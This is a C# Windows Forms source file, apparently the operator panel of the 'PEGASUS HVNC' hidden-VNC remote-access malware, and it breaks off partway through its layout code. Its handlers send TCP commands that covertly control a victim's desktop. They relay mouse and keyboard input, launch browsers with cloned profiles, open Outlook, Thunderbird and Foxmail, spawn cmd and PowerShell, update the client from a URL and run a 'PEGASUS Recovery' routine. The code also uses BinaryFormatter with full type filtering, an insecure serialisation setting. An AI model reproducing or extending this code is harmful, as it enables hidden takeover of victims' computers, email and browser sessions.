using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic.CompilerServices;
using PEGASUS_LIME.Properties;

namespace HVNC
{
	public class FrmVNC : Form
	{
		private TcpClient tcpClient_0;

		private int int_0;

		private bool bool_1;

		private bool bool_2;

		public FrmTransfer FrmTransfer0;

		private IContainer components;

		private Guna2ResizeBox guna2ResizeBox1;

		private Guna2Button guna2Button2;

		private Label label1;

		private Panel panel1;

		private Guna2ControlBox guna2ControlBox2;

		private Guna2ControlBox guna2ControlBox1;

		public StatusStrip statusStrip1;

		private ToolStripStatusLabel toolStripStatusLabel3;

		private Guna2DragControl guna2DragControl1;

		private System.Windows.Forms.Timer timer2;

		private ToolStripStatusLabel toolStripStatusLabel2;

		private ToolStripStatusLabel toolStripStatusLabel1;

		private System.Windows.Forms.Timer timer1;

		private Guna2ControlBox guna2ControlBox3;

		private Guna2ImageButton CloseBtn;

		private Guna2ImageButton RestoreMaxBtn;

		private Guna2ImageButton MinBtn;

		private Panel panel4;

		private Guna2TrackBar IntervalScroll;

		private Label IntervalLabel;

		private Guna2CustomCheckBox chkClone;

		private PictureBox pictureBox1;

		public ToolStripStatusLabel PingStatusLabel;

		private Guna2Button guna2Button3;

		private Guna2Button guna2Button1;

		private ToolStripSeparator toolStripSeparator1;

		private Panel panel3;

		private Guna2ContextMenuStrip guna2ContextMenuStrip2;

		private ToolStripMenuItem fileExplorerToolStripMenuItem;

		private ToolStripMenuItem powershellToolStripMenuItem;

		private ToolStripMenuItem cMDToolStripMenuItem;

		private ToolStripMenuItem windowsToolStripMenuItem;

		private Guna2ContextMenuStrip guna2ContextMenuStrip1;

		private ToolStripMenuItem test1ToolStripMenuItem;

		private ToolStripMenuItem test2ToolStripMenuItem;

		private ToolStripMenuItem braveToolStripMenuItem;

		private ToolStripMenuItem edgeToolStripMenuItem;

		private ToolStripMenuItem operaGXToolStripMenuItem;

		private Guna2ContextMenuStrip guna2ContextMenuStrip3;

		private Guna2Button guna2Button4;

		private ToolStripMenuItem thunderbirdToolStripMenuItem;

		private ToolStripMenuItem outlookToolStripMenuItem;

		private ToolStripMenuItem foxMailToolStripMenuItem;

		private ToolStripMenuItem copyToolStripMenuItem;

		private ToolStripMenuItem StophVNC;

		private ToolStripMenuItem toolStripMenuItem2;

		private ToolStripMenuItem StarthVNC;

		public Label ClientRecoveryLabel;

		private Guna2TrackBar QualityScroll;

		private PictureBox VNCBox;

		private Guna2TrackBar ResizeScroll;

		private Label chkClone1;

		private Guna2HtmlToolTip guna2HtmlToolTip1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		private Label label2;

		private Guna2Separator bunifuSeparator1;

		private Guna2Separator bunifuSeparator2;

		private Guna2Separator bunifuSeparator3;

		private Guna2Separator bunifuSeparator4;

		private Label QualityLabel;

		public PictureBox VNCBoxe
		{
			get
			{
				return VNCBox;
			}
			set
			{
				VNCBox = value;
			}
		}

		public ToolStripStatusLabel toolStripStatusLabel2_
		{
			get
			{
				return toolStripStatusLabel2;
			}
			set
			{
				toolStripStatusLabel2 = value;
			}
		}

		public string xip { get; set; }

		public string xhostname { get; set; }

		public FrmVNC()
		{
			int_0 = 0;
			bool_1 = true;
			bool_2 = false;
			FrmTransfer0 = new FrmTransfer();
			InitializeComponent();
			VNCBox.MouseEnter += VNCBox_MouseEnter;
			VNCBox.MouseLeave += VNCBox_MouseLeave;
			VNCBox.KeyPress += VNCBox_KeyPress;
		}

		private void VNCBox_MouseEnter(object sender, EventArgs e)
		{
			VNCBox.Focus();
		}

		private void VNCBox_MouseLeave(object sender, EventArgs e)
		{
			FindForm().ActiveControl = null;
			base.ActiveControl = null;
		}

		private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
		{
			SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
		}

		private void VNCForm_Load(object sender, EventArgs e)
		{
			if (FrmTransfer0.IsDisposed)
			{
				FrmTransfer0 = new FrmTransfer();
			}
			FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
			tcpClient_0 = (TcpClient)base.Tag;
			VNCBox.Tag = new Size(1028, 1028);
		}

		public void Check()
		{
			try
			{
				if (FrmTransfer0.FileTransferLabele.Text == null)
				{
					toolStripStatusLabel3.Text = "Status";
				}
				else
				{
					toolStripStatusLabel3.Text = FrmTransfer0.FileTransferLabele.Text;
				}
			}
			catch
			{
			}
		}

		private void timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				int_0 += 100;
				if (int_0 >= SystemInformation.DoubleClickTime)
				{
					bool_1 = true;
					bool_2 = false;
					int_0 = 0;
				}
			}
		}

		private void CopyBtn_Click(object sender, EventArgs e)
		{
			SendTCP("9*", tcpClient_0);
		}

		private void PasteBtn_Click(object sender, EventArgs e)
		{
		}

		private void ShowStart_Click(object sender, EventArgs e)
		{
			SendTCP("13*", tcpClient_0);
		}

		private void VNCBox_MouseDown(object sender, MouseEventArgs e)
		{
			if (bool_1)
			{
				bool_1 = false;
				timer1.Start();
			}
			else if (int_0 < SystemInformation.DoubleClickTime)
			{
				bool_2 = true;
			}
			Point location = e.Location;
			object tag = VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)VNCBox.Width / (double)size.Width;
			double num2 = (double)VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
			if (bool_2)
			{
				if (e.Button == MouseButtons.Left)
				{
					SendTCP("6*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
				}
			}
			else if (e.Button == MouseButtons.Left)
			{
				SendTCP("2*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
			else if (e.Button == MouseButtons.Right)
			{
				SendTCP("3*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
		}

		private void VNCBox_MouseUp(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)VNCBox.Width / (double)size.Width;
			double num2 = (double)VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
			if (e.Button == MouseButtons.Left)
			{
				SendTCP("4*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
			else if (e.Button == MouseButtons.Right)
			{
				SendTCP("5*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
		}

		private void VNCBox_MouseMove(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)VNCBox.Width / (double)size.Width;
			double num2 = (double)VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
			SendTCP("8*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
		}

		private void IntervalScroll_Scroll(object sender, EventArgs e)
		{
			IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
			SendTCP("17*" + Conversions.ToString(IntervalScroll.Value), tcpClient_0);
		}

		private void QualityScroll_Scroll(object sender, EventArgs e)
		{
			QualityLabel.Text = "Quality : " + Conversions.ToString(QualityScroll.Value) + "%";
			SendTCP("18*" + Conversions.ToString(QualityScroll.Value), tcpClient_0);
		}

		private void ResizeScroll_Scroll(object sender, EventArgs e)
		{
			chkClone1.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
			SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
		}

		private void RestoreMaxBtn_Click(object sender, EventArgs e)
		{
			SendTCP("15*", tcpClient_0);
		}

		private void MinBtn_Click(object sender, EventArgs e)
		{
			SendTCP("14*", tcpClient_0);
		}

		private void CloseBtn_Click(object sender, EventArgs e)
		{
			SendTCP("16*", tcpClient_0);
		}

		private void StartExplorer_Click(object sender, EventArgs e)
		{
			SendTCP("21*", tcpClient_0);
		}

		private void StartBrowserBtn_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("11*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("11*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						ulong num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
		{
			SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
		}

		private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			SendTCP("1*", tcpClient_0);
			VNCBox.Image = null;
			GC.Collect();
			Hide();
			e.Cancel = true;
		}

		private void VNCForm_Click(object sender, EventArgs e)
		{
			method_18(null);
		}

		private void method_18(object object_0)
		{
			base.ActiveControl = (Control)object_0;
		}

		private void button1_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("30*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("30*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void button2_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("12*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("12*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void button3_Click(object sender, EventArgs e)
		{
		}

		private void timer2_Tick(object sender, EventArgs e)
		{
			Check();
		}

		private void button4_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("32*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("32*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void closeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				SendTCP("24*", tcpClient_0);
				Close();
			}
		}

		private void button7_Click(object sender, EventArgs e)
		{
			SendTCP("4875*", tcpClient_0);
		}

		private void button8_Click(object sender, EventArgs e)
		{
			SendTCP("4876*", tcpClient_0);
		}

		private void IntervalScroll_Scroll(object sender, ScrollEventArgs e)
		{
			IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
			SendTCP("17*" + Conversions.ToString(IntervalScroll.Value), tcpClient_0);
		}

		private void ResizeScroll_Scroll(object sender, ScrollEventArgs e)
		{
			chkClone1.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
			SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
		}

		private void QualityScroll_Scroll(object sender, ScrollEventArgs e)
		{
			QualityLabel.Text = "High Quality : " + Conversions.ToString(QualityScroll.Value) + "%";
			SendTCP("18*" + Conversions.ToString(QualityScroll.Value), tcpClient_0);
		}

		private void guna2Button2_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				SendTCP("24*", tcpClient_0);
				Close();
			}
		}

		private void VNCBox_MouseHover(object sender, EventArgs e)
		{
			VNCBox.Focus();
		}

		private void guna2Button1_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("444*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("444*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void Outlookbtn_Click(object sender, EventArgs e)
		{
			SendTCP("555*", tcpClient_0);
		}

		private void Foxmailbtn_Click(object sender, EventArgs e)
		{
			SendTCP("556*", tcpClient_0);
		}

		private void Thunderbirdbtn_Click(object sender, EventArgs e)
		{
			SendTCP("557*", tcpClient_0);
		}

		private void guna2Button3_Click_1(object sender, EventArgs e)
		{
			guna2ContextMenuStrip2.Show(guna2Button1, 0, guna2Button1.Height);
		}

		private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("21*", tcpClient_0);
		}

		private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("4876*", tcpClient_0);
		}

		private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("4875*", tcpClient_0);
		}

		private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("13*", tcpClient_0);
		}

		private void guna2GroupBox1_Click(object sender, EventArgs e)
		{
		}

		private void guna2Button3_Click_2(object sender, EventArgs e)
		{
			guna2ContextMenuStrip2.Show(guna2Button3, 0, guna2Button3.Height);
		}

		private void guna2Button1_Click_1(object sender, EventArgs e)
		{
			guna2ContextMenuStrip1.Show(guna2Button1, 0, guna2Button1.Height);
		}

		private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("11*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("11*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void test2ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("12*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("12*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void braveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("32*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("32*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("30*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("30*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void operaGXToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("444*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("444*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void guna2Button4_Click_1(object sender, EventArgs e)
		{
			guna2ContextMenuStrip3.Show(guna2Button4, 0, guna2Button4.Height);
		}

		private void thunderbirdToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("557*", tcpClient_0);
		}

		private void outlookToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("555*", tcpClient_0);
		}

		private void foxMailToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("556*", tcpClient_0);
		}

		public void hURL(string url)
		{
			SendTCP("8585* " + url, (TcpClient)base.Tag);
		}

		public void UpdateClient(string url)
		{
			SendTCP("8589* " + url, (TcpClient)base.Tag);
		}

		public void ResetScale()
		{
			SendTCP("8587*", (TcpClient)base.Tag);
		}

		public void KillChrome()
		{
			SendTCP("8586*", (TcpClient)base.Tag);
		}

		public void PEGASUSRecovery()
		{
			SendTCP("3308*", (TcpClient)base.Tag);
			Thread.Sleep(500);
		}

		private void copyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("3307*", tcpClient_0);
		}

		private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("3306*" + Clipboard.GetText(), (TcpClient)base.Tag);
		}

		private void StarthVNC_Click(object sender, EventArgs e)
		{
			SendTCP("0*", tcpClient_0);
			FrmTransfer0.FileTransferLabele.Text = "hVNC Started!";
		}

		private void StophVNC_Click(object sender, EventArgs e)
		{
			SendTCP("1*", tcpClient_0);
			VNCBox.Image = null;
			FrmTransfer0.FileTransferLabele.Text = "hVNC Stopped!";
			GC.Collect();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.FrmVNC));
			guna2ResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
			guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(components);
			panel1 = new System.Windows.Forms.Panel();
			bunifuSeparator2 = new Guna2Separator();
			bunifuSeparator1 = new Guna2Separator();
			label2 = new System.Windows.Forms.Label();
			CloseBtn = new Guna.UI2.WinForms.Guna2ImageButton();
			RestoreMaxBtn = new Guna.UI2.WinForms.Guna2ImageButton();
			IntervalLabel = new System.Windows.Forms.Label();
			MinBtn = new Guna.UI2.WinForms.Guna2ImageButton();
			IntervalScroll = new Guna.UI2.WinForms.Guna2TrackBar();
			guna2Button3 = new Guna.UI2.WinForms.Guna2Button();
			QualityScroll = new Guna.UI2.WinForms.Guna2TrackBar();
			QualityLabel = new System.Windows.Forms.Label();
			guna2Button2 = new Guna.UI2.WinForms.Guna2Button();
			ResizeScroll = new Guna.UI2.WinForms.Guna2TrackBar();
			label1 = new System.Windows.Forms.Label();
			chkClone1 = new System.Windows.Forms.Label();
			guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
			chkClone = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			guna2Button4 = new Guna.UI2.WinForms.Guna2Button();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			guna2ControlBox3 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
			statusStrip1 = new System.Windows.Forms.StatusStrip();
			toolStripStatusLabel3 = new System.Windows.Forms.ToolStripStatusLabel();
			PingStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
			ClientRecoveryLabel = new System.Windows.Forms.Label();
			timer2 = new System.Windows.Forms.Timer(components);
			toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
			toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
			timer1 = new System.Windows.Forms.Timer(components);
			panel4 = new System.Windows.Forms.Panel();
			bunifuSeparator3 = new Guna2Separator();
			bunifuSeparator4 = new Guna2Separator();
			toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
			panel3 = new System.Windows.Forms.Panel();
			guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			fileExplorerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			powershellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			cMDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			windowsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			StarthVNC = new System.Windows.Forms.ToolStripMenuItem();
			StophVNC = new System.Windows.Forms.ToolStripMenuItem();
			guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			test1ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			test2ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			braveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			edgeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			operaGXToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			guna2ContextMenuStrip3 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			thunderbirdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			outlookToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			foxMailToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			VNCBox = new System.Windows.Forms.PictureBox();
			guna2HtmlToolTip1 = new Guna.UI2.WinForms.Guna2HtmlToolTip();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			statusStrip1.SuspendLayout();
			panel4.SuspendLayout();
			guna2ContextMenuStrip2.SuspendLayout();
			guna2ContextMenuStrip1.SuspendLayout();
			guna2ContextMenuStrip3.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)VNCBox).BeginInit();
			SuspendLayout();
			guna2ResizeBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2ResizeBox1.BackColor = System.Drawing.Color.Black;
			guna2ResizeBox1.FillColor = System.Drawing.Color.Gainsboro;
			guna2ResizeBox1.ForeColor = System.Drawing.Color.Black;
			guna2ResizeBox1.Location = new System.Drawing.Point(1178, 824);
			guna2ResizeBox1.Name = "guna2ResizeBox1";
			guna2ResizeBox1.Size = new System.Drawing.Size(20, 22);
			guna2ResizeBox1.TabIndex = 35;
			guna2ResizeBox1.TargetControl = this;
			guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
			guna2DragControl1.TargetControl = panel1;
			guna2DragControl1.UseTransparentDrag = true;
			panel1.BackColor = System.Drawing.Color.Black;
			panel1.Controls.Add(bunifuSeparator2);
			panel1.Controls.Add(bunifuSeparator1);
			panel1.Controls.Add(label2);
			panel1.Controls.Add(CloseBtn);
			panel1.Controls.Add(RestoreMaxBtn);
			panel1.Controls.Add(IntervalLabel);
			panel1.Controls.Add(MinBtn);
			panel1.Controls.Add(IntervalScroll);
			panel1.Controls.Add(guna2Button3);
			panel1.Controls.Add(QualityScroll);
			panel1.Controls.Add(QualityLabel);
			panel1.Controls.Add(guna2Button2);
			panel1.Controls.Add(ResizeScroll);
			panel1.Controls.Add(label1);
			panel1.Controls.Add(chkClone1);
			panel1.Controls.Add(guna2Button1);
			panel1.Controls.Add(chkClone);
			panel1.Controls.Add(guna2Button4);
			panel1.Controls.Add(pictureBox1);
			panel1.Controls.Add(guna2ControlBox3);
			panel1.Controls.Add(guna2ControlBox2);
			panel1.Controls.Add(guna2ControlBox1);
			panel1.Dock = System.Windows.Forms.DockStyle.Right;
			panel1.Location = new System.Drawing.Point(1055, 0);
			panel1.Name = "panel1";
			panel1.Size = new System.Drawing.Size(143, 845);
			panel1.TabIndex = 32;
			bunifuSeparator2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			bunifuSeparator2.Location = new System.Drawing.Point(136, -34);
			bunifuSeparator2.Margin = new System.Windows.Forms.Padding(2);
			bunifuSeparator2.Name = "bunifuSeparator2";
			bunifuSeparator2.Size = new System.Drawing.Size(10, 912);
			bunifuSeparator2.TabIndex = 260;
			bunifuSeparator1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			bunifuSeparator1.Location = new System.Drawing.Point(-5, 0);
			bunifuSeparator1.Margin = new System.Windows.Forms.Padding(2);
			bunifuSeparator1.Name = "bunifuSeparator1";
			bunifuSeparator1.Size = new System.Drawing.Size(10, 847);
			bunifuSeparator1.TabIndex = 259;
			label2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			label2.AutoSize = true;
			label2.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label2.ForeColor = System.Drawing.Color.White;
			label2.Location = new System.Drawing.Point(20, 183);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(107, 16);
			label2.TabIndex = 152;
			label2.Text = "PEGASUS HVNC";
			CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			CloseBtn.BackColor = System.Drawing.Color.Transparent;
			CloseBtn.CheckedState.ImageSize = new System.Drawing.Size(64, 64);
			CloseBtn.CheckedState.Parent = CloseBtn;
			CloseBtn.HoverState.ImageSize = new System.Drawing.Size(31, 31);
			CloseBtn.HoverState.Parent = CloseBtn;
			CloseBtn.Image = PEGASUS_LIME.Properties.Resources.x1;
			CloseBtn.ImageOffset = new System.Drawing.Point(0, 0);
			CloseBtn.ImageRotate = 0f;
			CloseBtn.ImageSize = new System.Drawing.Size(30, 30);
			CloseBtn.Location = new System.Drawing.Point(91, 730);
			CloseBtn.Name = "CloseBtn";
			CloseBtn.PressedState.ImageSize = new System.Drawing.Size(31, 31);
			CloseBtn.PressedState.Parent = CloseBtn;
			CloseBtn.ShadowDecoration.Parent = CloseBtn;
			CloseBtn.Size = new System.Drawing.Size(36, 32);
			CloseBtn.TabIndex = 41;
			guna2HtmlToolTip1.SetToolTip(CloseBtn, "Close Selected Window!");
			CloseBtn.UseTransparentBackground = true;
			CloseBtn.Click += new System.EventHandler(CloseBtn_Click);
			RestoreMaxBtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			RestoreMaxBtn.BackColor = System.Drawing.Color.Transparent;
			RestoreMaxBtn.CheckedState.ImageSize = new System.Drawing.Size(64, 64);
			RestoreMaxBtn.CheckedState.Parent = RestoreMaxBtn;
			RestoreMaxBtn.HoverState.ImageSize = new System.Drawing.Size(31, 31);
			RestoreMaxBtn.HoverState.Parent = RestoreMaxBtn;
			RestoreMaxBtn.Image = PEGASUS_LIME.Properties.Resources.maxi;
			RestoreMaxBtn.ImageOffset = new System.Drawing.Point(0, 0);
			RestoreMaxBtn.ImageRotate = 0f;
			RestoreMaxBtn.ImageSize = new System.Drawing.Size(30, 30);
